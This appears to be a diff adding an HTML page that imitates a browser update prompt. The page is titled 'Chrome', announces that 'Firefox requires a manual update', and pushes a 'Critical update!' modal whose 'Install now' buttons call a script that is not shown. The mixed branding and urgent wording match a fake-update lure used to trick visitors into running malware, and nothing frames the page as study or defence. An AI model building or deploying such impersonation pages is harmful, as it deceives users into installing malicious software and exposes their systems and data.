@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="src/css/blocks/normalize.css">
+    <link rel="stylesheet" href="src/css/blocks/style.min.css">
+    <title>Chrome</title>
+</head>
+
+<body>
+    <main class="main">
+        <div class="container">
+            <header class="header">
+                <a href="#" target="_blank" class="header__logo">
+                    <img src="img/logo-word-hor.e20791bb4dd4.svg" alt="logo" class="logo">
+                </a>
+            </header>
+            <section class="update">
+                <div class="uprate__logo"><img src="img/logo-word-hor-white.c4873b25894a.svg" alt="logo"></div>
+                <span class="update__title">
+                    Firefox requires a manual update
+                </span>
+                <span class="update__subtitle">
+                    This update is neccesary to ensure that you are protected on the internet.
+                </span>
+                <a href="#" class="update__button">
+                    Install now
+                </a>
+            </section>
+        </div>
+    </main>
+
+    <div class="modal__wrapper" id="modal__wrapper">
+        <div class="modal" id="modal">
+            <div class="modal__title">Critical update!</div>
+            <div class="modal__subtitle">This update is neccesary to ensure that you are protected on the internet.
+            </div>
+            <a href="#" onclick="noperevod(event);" class="modal__button" id="modal__button">Install now</a>
+            <a href="#" onclick="noperevod(event);" class="modal__close" id="modal__close"> <span></span> </a>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+</body>
+
+</html>
